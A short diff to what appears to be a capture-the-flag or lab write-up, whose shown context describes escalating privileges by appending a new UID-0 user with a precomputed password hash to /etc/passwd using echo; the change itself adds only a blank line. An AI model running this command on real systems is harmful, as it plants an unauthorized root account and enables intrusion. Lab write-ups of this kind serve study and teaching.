@@ -67,6 +67,7 @@ Since we have write access as brexit user, we can use openssl to escalate privil
 
 With `echo`, let's add a new user manually:
 `echo 'foo:$1$foo$vIxZ6xcPqixL6sHxOWInM1:0:0:root:/root:/bin/bash' >> /etc/passwd`
+
 obs: Its necessary to use single quotes, or the new user is not added.
 
 ![c822d5c8d2b6c604aa7e0bfa3ca82185.png](./_resources/483d8f387d9f4c9c90c9eed9ec538208.png)
